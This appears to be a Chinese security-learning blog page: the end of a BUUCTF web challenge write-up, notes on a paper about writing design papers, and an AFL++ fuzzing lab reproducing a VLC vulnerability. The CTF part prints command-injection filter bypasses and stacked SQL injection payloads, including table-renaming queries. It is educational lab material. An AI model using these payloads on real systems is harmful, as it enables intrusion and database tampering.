<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt: $IFS$9 $9指传过来的第9个参数</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg (\x20转换成字符串就是空格)</span><br></pre></td></tr></table></figure>

<p>发现符号又被过滤了，说明<code>&#123;&#125;</code>大括号被过滤了</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/edc798c1-1d33-40e5-ba2d-3044ba3e2d10" alt="image"></p>
<p>用另一个方法试下index.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/614c2964-8a82-41be-b50c-51b4d29bc50e" alt="image"></p>
<p>有一个参数a，<strong>变量拼接字符串——将a的值覆盖，然后进行绕过</strong></p>
<p>构造payload：<code>/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>
<p>用变量拼接成flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1db4f885-23d5-40b5-9d8a-291a10eae7f6" alt="image"></p>
<p>啥也没有，查看源代码，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8ea1b222-1b2e-420a-8a81-137e674b2caf" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;97aede41-9723-4901-8ac2-b345d66af44b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="7、随便注"><a href="#7、随便注" class="headerlink" title="7、随便注"></a>7、随便注</h4><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1fe10469-06c6-4c22-87f0-1a3886b61577" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0cd3e27d-e133-4673-bcc7-2d008ce22b09" alt="image"></p>
<p>查询3时没有显示，说明有两个字段</p>
<p>爆数据库：1’;show databases;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d0f5ed71-751c-4117-9195-f3178caa3dd2" alt="image"></p>
<p>爆表名：1’; show tables;#</p>
<p>出来了两个表</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f636bbac-e56c-4091-bf74-ebe0f39634cf" alt="image"></p>
<p>查看words表列名：1’; show columns from words;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6bdf874f-d98f-49ee-a0e6-b5a1df7495b0" alt="image"></p>
<p>查看1919810931114514表列名：0’; show columns from <code>1919810931114514</code>;#</p>
<p>注意：表名为数字时，要用反引号包起来查询</p>
<p>看到flag，说明表1919810931114514中有flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1be25d80-699d-4449-981a-4ba85f3228b3" alt="image"></p>
<p>查看大佬的方法</p>
<ul>
<li><p>通过 rename 先把 words 表改名为其他的表名。</p>
</li>
<li><p>把 1919810931114514 表的名字改为 words 。</p>
</li>
<li><p>给新 words 表添加新的列名 id 。</p>
</li>
<li><p>将 flag 改名为 data </p>
<p>1’; rename table words to word1; rename table <code>1919810931114514</code> to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/595a5ad4-0393-4542-9b16-f32cd7633903" alt="image"></p>
</li>
</ul>
<p>最后输入：1’ or 1&#x3D;1;#</p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b2b3bcda-a630-4c63-a614-a68ba770a02a" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aa75e48d-8389-408e-9c8c-9d30c81c432b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="8、EasySQL"><a href="#8、EasySQL" class="headerlink" title="8、EasySQL"></a>8、EasySQL</h4><p>输入1，有显示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/24aa574b-2e43-454e-8df1-8dbb3b104abd" alt="image"></p>
<p>爆数据库：1;show databases;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0320260a-c0f9-4e36-b544-bb0ba53de8a0" alt="image"></p>
<p>爆表：1;show tables;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ee2d1ebd-03b9-48f9-984f-10acee8da107" alt="image"></p>
<p>爆字段：1;show columns from FLAG;#</p>
<p>显示Nonono</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/faaaf7dd-fd3e-4fe1-8eb9-2c66d9b23046" alt="image"></p>
<p>查看大佬博客后，构造payload：*,1</p>
<p>参考博客（[BUUCTF-<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/120188186">SUCTF 2019]EasySQL1__Monica_的博客-CSDN博客</a>）</p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9321cfe6-b625-4707-9703-8ecbdf5d1a9b" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7c0c6069-c1fe-4314-b793-9a214f11fdb3&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/07/Buuctf%20Web%EF%BC%881-8%EF%BC%89/" data-id="cll0v0lih0000povf909mhcek" data-title="Buuctf Web（1-8）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-《How (and How Not) to Write a Good Design Paper》" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/03/%E3%80%8AHow%20(and%20How%20Not)%20to%20Write%20a%20Good%20Design%20Paper%E3%80%8B/" class="article-date">
  <time class="dt-published" datetime="2023-08-03T03:00:09.000Z" itemprop="datePublished">2023-08-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/03/%E3%80%8AHow%20(and%20How%20Not)%20to%20Write%20a%20Good%20Design%20Paper%E3%80%8B/">《How (and How Not) to Write a Good Design Paper》</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="《How-and-How-Not-to-Write-a-Good-Design-Paper》论文细读"><a href="#《How-and-How-Not-to-Write-a-Good-Design-Paper》论文细读" class="headerlink" title="《How (and How Not) to Write a Good Design Paper》论文细读"></a>《How (and How Not) to Write a Good Design Paper》论文细读</h3><h4 id="如何（如何不）写一篇好的设计论文"><a href="#如何（如何不）写一篇好的设计论文" class="headerlink" title="如何（如何不）写一篇好的设计论文"></a>如何（如何不）写一篇好的设计论文</h4><p><a href="extension://bfdogplmndidlpjfhoijckpakkdjkkil/pdf/viewer.html?file=https%3A%2F%2Fwww.ida.liu.se%2F~matar63%2Fdesignpaper.pdf">extension:&#x2F;&#x2F;bfdogplmndidlpjfhoijckpakkdjkkil&#x2F;pdf&#x2F;viewer.html?file&#x3D;https%3A%2F%2Fwww.ida.liu.se%2F~matar63%2Fdesignpaper.pdf</a></p>
<h4 id="论文类别"><a href="#论文类别" class="headerlink" title="论文类别"></a>论文类别</h4><p>1、论文呈现了一个真正的设计项目，要么通过整个设计项目的全球调查，要么通过设计中体现的特定主题的选择性审查</p>
<p>2、论文展示了从未实现或实例化的概念设计工作，使用了我们认为设计者应该知道的想法或技术</p>
<p>3、论文解决了研究领域的一个方向，比如说可持续性</p>
<h4 id="投稿的评价标准"><a href="#投稿的评价标准" class="headerlink" title="投稿的评价标准"></a>投稿的评价标准</h4><h5 id="独到见解"><a href="#独到见解" class="headerlink" title="独到见解"></a>独到见解</h5><p>将论文投稿至与原创作品相关的会议或期刊时，论文至少包含一个新的想法，我们必须熟悉论文所涉及领域的最新技术和研究现状，才能知道我们的工作的原创的。</p>
<p>我们能简明扼要地陈述这个新想法吗？如果我们的论文是为了推进知识的状态，那么我们的读者必须能够发现新思想并理解它们。尝试把每个想法写在一个段落中，一般精通领域相关的人都能理解。如果做不到把每个想法写在一个段落中，那么可能我们自己没有真正理解这个想法的可能性，当我们有了框架，在论文摘要中要写到它们。</p>
<p>要解决的具体设计挑战是什么？我们不能之王读者只看到设计解决方案的描述就猜到我们面临的挑战或问题。一定要具体解释为什么以前的论文没法很好解决我们的设计挑战。</p>
<p>这些想法是否足够重要，足以证明论文的合理性？通常，描述真实设计工作的论文包含一到两个既定技术的改进，新的想法可以用几段话来描述，没必要一篇论文写20页，这样可能会掩盖实际的创新。开发一个真正的设计是一项繁重的工作，作者有时会不经意间将全部努力与新工作混为一谈，如果创新小，在合适的期刊或会议上发表一篇简短的论文或笔记，比发表完整论文更合适。</p>
<p>描述的工作是否与现有的相关工作有显著不同？我们基于先前发表的方法、技术或设计解决方案的扩张，不值得发表，我们必须证明自己的工作代表着与先进技术的背离，如果做不到，问自己为什么要写这篇文章，我们要让更多人愿意看我们的文章。</p>
<p>相关工作都有参考吗，针对读过被引用的材料吗？除非我们明确地将论文与之前发表的作品区分开，否则很耐说服读者相信我们的原创性。并且，如果读者读过被引用的文章，而我们没读过，那么会更难说服读者认可我们方法的优越性。</p>
<p>与以前工作的比较是否清楚和明确？我们不能简单地说我们的方法与别人的有所不同，我们要具体地说，我们的用户界面方法使用的是有形的部件，而不是像别人那样设计的触摸板，预期会增加几个用户的合作与参与度。</p>
<p>这项工作是否包含了对早期但未经证实的想法的扩展，验证或否定？支持或反驳先前发表的论文设计的评估经验是非常有价值的。</p>
<p>我们引用的最古老的论文是什么，最新的呢？有没有提到其他机构的类似工作？引用过技术报告，未发表的备忘录，未审阅的在线材料，个人交流吗？这些问题有助于提醒我们在知识或理解上存在的盲点。</p>
<h5 id="现实"><a href="#现实" class="headerlink" title="现实"></a>现实</h5><p>这篇论文描述的是一些已经以某种方式实现的东西还是完全是概念性的？有很多论文在结束语部分才会揭示，这是不太好的，读者英高在一开始就知道正在讨论的设计作品是一个真正的设计项目，还是仅仅为论证而做的概念设计。</p>
<p>如果设计已经实现，它是如何被使用的，这种使用表明了关于想法的实际重要性的什么？如果设计工作是一个尚未实现或原型化的概念，那么这些想法现在是否有出版的理由？审稿人通常对只有设计而没有任何评估的论文持怀疑态度，除非有高质量的新想法。</p>
<h5 id="教训"><a href="#教训" class="headerlink" title="教训"></a>教训</h5><p>如果我们在工作中什么都没学到，那么读者也学不到，我们的论文只会浪费读者的时间。我们要清楚地陈述我们结论所基于的假设，并且在陈述结论时，有必要再次陈述假设，因为读者读到后面可能会忘记假设。</p>
<h5 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h5><p>我们考虑了哪些备选方案，为什么会做出这样的选择？一篇好的论文不只是描述，而是解释，我们要告诉读者我们做了什么，并不是让他们知道我们的选择有多仔细。</p>
<p>这些选择最终被证明是正确的吗？如果是，那么最初选择它的原因是什么，我们从这个经理中学到了什么？如果我们在研究过程中碰到了死胡同，可以记录下来，让读者不要走同样的死胡同。</p>
<h5 id="上下文"><a href="#上下文" class="headerlink" title="上下文"></a>上下文</h5><p>如果想读者对我们的观点持支持态度，我们要首先将论点假设陈述出来。</p>
<p>它们现实吗？对于理论研究，必须清楚假设如何反应现实。</p>
<p>工作对假设的变化是否敏感？如果如果结果巧妙地建立在一个由不稳定的假设组成的高塔上，那么对于读者来说，它的用处将不如建立在更广泛，更牢固的基础上的结果有用。</p>
<p>如果提出一个理论模型，它是否给出了新的信息和见解？简单地为模型本身定义并没有用。</p>
<h5 id="焦点"><a href="#焦点" class="headerlink" title="焦点"></a>焦点</h5><p>介绍性材料是否包含我们的主要设计重点的多余内容？我们要避免在同一个深度层次上描述你的设计所由的主要特征，应该专注于新颖或不寻常的内容，这才是论文原始设计内容的重点。</p>
<h5 id="演讲"><a href="#演讲" class="headerlink" title="演讲"></a>演讲</h5><p>这些想法是否以清晰且有逻辑的方式组织和呈现？术语在使用前是否有明确定义？前向引用是否保持在最低限度？当读者反复遇到“***将在后面一节详细描述”这样的语句时会感到非常恼火，读者必须记住专业术语，且此时还没给出这个术语的定义，这对读者来说是不易于理解的。</p>
<p>摘要是先写的吗？它是否传达了论文的重要思想？论文中描述设计的摘要被滥用严重，摘要通常是一个散文的目录，而不是论文的技术内容摘要。</p>
<p>论文写完了吗？审稿人通常可以帮忙改进论文，但是不能替我们写。并且在描述设计的论文中，审稿人不能容忍作者遗漏重要的解释或论证。</p>
<h5 id="写作风格"><a href="#写作风格" class="headerlink" title="写作风格"></a>写作风格</h5><p>文章是否清晰简洁？单词的拼写和使用正确吗？句子是否完整，语法是否正确？是否避免歧义？在提交论文前，我们要仔细阅读论文，检查错误。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在写论文，组织演讲时，我们要不断问自己上述的问题。有一些问题针对的是“设计”论文中的具体问题，有的适用于一般的研究论文。写一篇好的论文是一项艰苦的工作，但是我们能学到很多，并且帮助读者从我们的想法中有所收获。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/03/%E3%80%8AHow%20(and%20How%20Not)%20to%20Write%20a%20Good%20Design%20Paper%E3%80%8B/" data-id="cll0m250z0000k0vfhi0y1beq" data-title="《How (and How Not) to Write a Good Design Paper》" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Exercise 7 - VLC Media Player" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/01/Exercise%207%20-%20VLC%20Media%20Player/" class="article-date">
  <time class="dt-published" datetime="2023-08-01T15:21:53.000Z" itemprop="datePublished">2023-08-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/01/Exercise%207%20-%20VLC%20Media%20Player/">Exercise 7 - VLC Media Player</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Exercise-7-VLC-Media-Player"><a href="#Exercise-7-VLC-Media-Player" class="headerlink" title="Exercise 7 - VLC Media Player"></a>Exercise 7 - VLC Media Player</h3><h4 id="一、实验背景"><a href="#一、实验背景" class="headerlink" title="一、实验背景"></a>一、实验背景</h4><p><strong>CVE-2019-14776</strong>是一个越界读取漏洞，可以通过精心制作的WMV&#x2F;ASF (Windows Media Video)文件触发。越界读取是当程序读取数据超过预期缓冲区的末尾或开始之前时发生的漏洞。因此，它允许远程攻击者导致拒绝服务或可能从进程内存中获取潜在的敏感信息。</p>
<p>越界读取漏洞（<a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/125.html%EF%BC%89">https://cwe.mitre.org/data/definitions/125.html）</a></p>
<p><strong>部分仪器仪表</strong></p>
<p>使用进化覆盖引导的模糊器的优点之一是，它能够自己找到新的执行路径。然而，这通常也是一个缺点。当我们面对具有高度模块化架构的软件(如VLC媒体播放器)时，每个模块执行特定的任务。</p>
<p>那么，假设我们给监控器提供了一个有效的MKV文件。但是在对输入文件进行了几次修改之后，“magic bytes”文件发生了变化，现在我们的程序将输入文件视为AVI文件。因此，这个“变异的MKV文件”现在由AVI Demux处理。一段时间后，文件魔术字节再次改变，现在文件被视为MPEG文件。在这两种情况下，这个新修改的文件增加代码覆盖率的可能性都很低，因为这个新文件没有任何有效的语法结构。</p>
<p>简而言之，如果我们不对代码覆盖率施加限制，模糊测试者很容易选择错误的路径，从而使模糊测试过程效率降低。</p>
<p>为了解决这个问题，afl++包含了一个部分插装特性，它允许指定应该使用或不使用插装来编译哪些函数&#x2F;文件。这有助于模糊器专注于程序的重要部分，通过执行无趣的代码路径来避免不必要的噪声和干扰。</p>
<p>为了使用它，我们在编译时设置环境AFL_LLVM_ALLOWLIST变量。这个环境变量必须指向一个包含所有应该检测的函数&#x2F;文件名的文件。</p>
<p>afl++部分仪器（<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.instrument_list.md%EF%BC%89">https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.instrument_list.md）</a></p>
<h4 id="二、实验目的"><a href="#二、实验目的" class="headerlink" title="二、实验目的"></a>二、实验目的</h4><p>模糊<strong>VLC</strong>媒体播放器。目标是在VLC 3.0.7.1中找到<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2019-14776"><strong>CVE-2019-14776</strong></a>的崩溃&#x2F;PoC</p>
<h4 id="三、实验环境："><a href="#三、实验环境：" class="headerlink" title="三、实验环境："></a>三、实验环境：</h4><p>win10，VMware，Ubuntu 20.04.2 LTS（虚拟机用户名密码均为fuzz）</p>
<h4 id="四、实验步骤"><a href="#四、实验步骤" class="headerlink" title="四、实验步骤"></a>四、实验步骤</h4><h5 id="1、下载并构建目标"><a href="#1、下载并构建目标" class="headerlink" title="1、下载并构建目标"></a>1、下载并构建目标</h5><p>得到模糊目标，为要模糊化的项目创建一个新目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_vlc &amp;&amp; cd fuzzing_vlc</span><br></pre></td></tr></table></figure>

<p>下载并解压vlc-3.0.7.1.tar.xz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.videolan.org/pub/videolan/vlc/3.0.7.1/vlc-3.0.7.1.tar.xz</span><br><span class="line">tar -xvf vlc-3.0.7.1.tar.xz &amp;&amp; cd vlc-3.0.7.1/</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3202c8c2-020e-43e7-acdd-6b1fc2e1b5d3" alt="image"></p>
<p>发现下载链接连接失败，用管理员身份下载，解决问题</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/cd3e5bab-c56e-461b-bf35-3a206fe5ca17" alt="image"></p>
<h5 id="2、构建VCL"><a href="#2、构建VCL" class="headerlink" title="2、构建VCL"></a>2、构建VCL</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=&quot;$HOME/fuzzing_vlc/vlc-3.0.7.1/install&quot; --disable-a52 --disable-lua --disable-qt</span><br><span class="line">make -j$(nproc)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b5ea12b-8a45-4fc8-98c8-055762f3074e" alt="image"></p>
<p>报错</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0abd4ced-6a37-410c-abbd-67d841f13c68" alt="image"></p>
<p>解决方案</p>
<p>安装一些必要的依赖库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libxcb-composite0-dev libxcb-glx0-dev libxcb-dri2-0-dev libxcb-xf86dri0-dev libxcb-xinerama0-dev libxcb-render-util0-dev</span><br><span class="line">apt-get install libxcb-xv0-dev</span><br><span class="line">apt-get install libxcb-randr0-dev</span><br><span class="line">apt-get install libasound2-dev</span><br><span class="line">apt-get install libvlc-dev</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0982fa2d-3152-4151-8ada-79eb2f254b18" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/34af0e30-08f8-44bc-9349-8f8e6ce30010" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/96b4bcc3-158c-4b6e-ba44-2ababb31bfad" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9f19e66f-ad36-4128-9c95-612efba4dd7e" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/73c23d48-c702-439c-97f2-8662bad8ad61" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e218173c-f154-40cb-aca9-f3963f021a79" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d737430f-45fd-4c50-bde3-90fc21f656b8" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b0692ec5-08db-4708-8dd7-de887b5a130e" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/440e516b-b84e-46c4-811b-a04766c51586" alt="image"></p>
<p>安装完依赖库后，重新运行.config，成功构建VCL</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/fd9c3400-3ea2-4430-baa4-e1e3748ca356" alt="image"></p>
<p>测试工作是否正确</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/vlc-static --help</span><br></pre></td></tr></table></figure>

<p>如看到以下页面，说明工作正确</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2f1b8946-18bc-46d3-a7ef-e80a8c48401c" alt="image"></p>
<h5 id="3、种子语料库创建"><a href="#3、种子语料库创建" class="headerlink" title="3、种子语料库创建"></a>3、种子语料库创建</h5><p>可以在<a target="_blank" rel="noopener" href="https://samples.ffmpeg.org/">ffmpeg示例库</a>中找到大量视频示例。</p>
<p>建议挑选一些样本，然后使用视频编辑器将视频文件缩小到尽可能小的大小。</p>
<p>以下是一些开源视频编辑器的例子:</p>
<p>——(OpenShot) (<a target="_blank" rel="noopener" href="https://www.openshot.org/">https://www.openshot.org/</a>)</p>
<p>——(Shotcut) (<a target="_blank" rel="noopener" href="https://shotcut.org/">https://shotcut.org/</a>)</p>
<p>或者复制<a href="./InputCorpus/short2.wmv">short2.wmv</a>和<a href="./InputCorpus/veryshort.wmv">veryshort.wmv</a>文件到AFL输入文件夹</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/723e0f2a-62c7-4376-b9e2-c3e281cf0240" alt="image"></p>
<h5 id="4、fuzzing线束"><a href="#4、fuzzing线束" class="headerlink" title="4、fuzzing线束"></a>4、fuzzing线束</h5><p>如果尝试直接模糊“vlc-static”二进制文件，将看到AFL每秒只执行几次。这是因为VLC启动非常耗时。这就是为什么为模糊测试VLC创建一个自定义模糊测试线束。</p>
<p>修改’ ‘ .&#x2F;test&#x2F;vlc-demux-run.c ‘ ‘文件以包含模糊测试工具。通过这种方式，只需执行以下操作即可编译该harness:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd test</span><br><span class="line">make vlc-demux-run -j$(nproc) LDFLAGS=&quot;-fsanitize=address&quot;</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8c630391-698e-495d-ae8b-520a844d8999" alt="image"></p>
<p>由于该错误存在于ASF解模中，所以调用<strong>vlc_demux_process_memory</strong>函数。这个函数尝试删除先前存储在内存中的数据缓冲区。可以在这里找到代码修改(.&#x2F;fuzzing_harness.patch)</p>
<h5 id="5、部分仪器化"><a href="#5、部分仪器化" class="headerlink" title="5、部分仪器化"></a>5、部分仪器化</h5><p>一开始，尝试只包括ASF拆模所涉及的文件名。不幸的是，这种方法不起作用。似乎文件名匹配是<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/issues/1018#issuecomment-879045408">并不总是可能的</a>，所以选择了一个混合的方法，包括函数匹配和文件名匹配</p>
<p>可以下载部分检测文件(.&#x2F;Partial_instrumentation)</p>
<h5 id="6、小改动"><a href="#6、小改动" class="headerlink" title="6、小改动"></a>6、小改动</h5><p>为了加快ASF模糊测试的速度，建议将这个补丁应用到<strong>modules&#x2F;demux&#x2F;libasf.c</strong> (目前没有更多的线索;)):[speeup .patch](.&#x2F; speeup .patch)</p>
<h5 id="7、fuzzing"><a href="#7、fuzzing" class="headerlink" title="7、fuzzing"></a>7、fuzzing</h5><p>使用<strong>afl-clang-fast</strong>作为编译器并启用ASAN构建VLC的时间</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CC=&quot;afl-clang-fast&quot; CXX=&quot;afl-clang-fast++&quot; ./configure --prefix=&quot;$HOME/fuzzing_vlc/vlc-3.0.7.1/install&quot; --disable-a52 --disable-lua --disable-qt --with-sanitizer=address</span><br><span class="line">AFL_LLVM_ALLOWLIST=$HOME/fuzzing_vlc/vlc-3.0.7.1/Partial_instrumentation make -j$(nproc) LDFLAGS=&quot;-fsanitize=address&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/75b90691-fdd0-4623-959a-509166ccf415" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8805c9e9-c6df-49bc-95e8-4100fa926990" alt="image"></p>
<p>构建模糊控制装置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd test</span><br><span class="line">make vlc-demux-run -j$(nproc) LDFLAGS=&quot;-fsanitize=address&quot;</span><br><span class="line">cd ..  </span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7375cb28-c429-4fcb-8f73-86377f36c6c9" alt="image"></p>
<p>运行fuzzer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -t 100 -m none -i &#x27;./afl_in&#x27; -o &#x27;./afl_out&#x27; -x asf_dictionary.dict -D -M master -- ./test/vlc-demux-run @@    </span><br></pre></td></tr></table></figure>

<p>注意事项：超时参数严重依赖于计算机，需要调整这个值</p>
<p>过一段时间，可以看到多个崩溃</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/378225ea-06c2-4351-a815-85f48b7a257c" alt="image"></p>
<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230802153658669.png" alt="image-20230802153658669"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/63ee9621-c317-45f4-b390-4628ce9960a5" alt="Image1"></p>
<h5 id="8、Triage"><a href="#8、Triage" class="headerlink" title="8、Triage"></a>8、Triage</h5><p>ASan跟踪可能看起来像</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/21e1a6e2-dd80-41fb-8660-8646c6502027" alt="image3"></p>
<h5 id="9、修复问题"><a href="#9、修复问题" class="headerlink" title="9、修复问题"></a>9、修复问题</h5><p>修复这两个bug后重建目标，并检查PoC不再使程序崩溃</p>
<h4 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h4><p>通过这个实验，我了解了<strong>CVE-2019-14776</strong>漏洞，学会如何使用部分仪器只对程序的相关部分进行仪器检测，如何编写模糊测试工具来更有效地测试大型应用程序</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/01/Exercise%207%20-%20VLC%20Media%20Player/" data-id="clktgz1j70000p8vff6fg5aw8" data-title="Exercise 7 - VLC Media Player" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/learn/" rel="tag">learn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
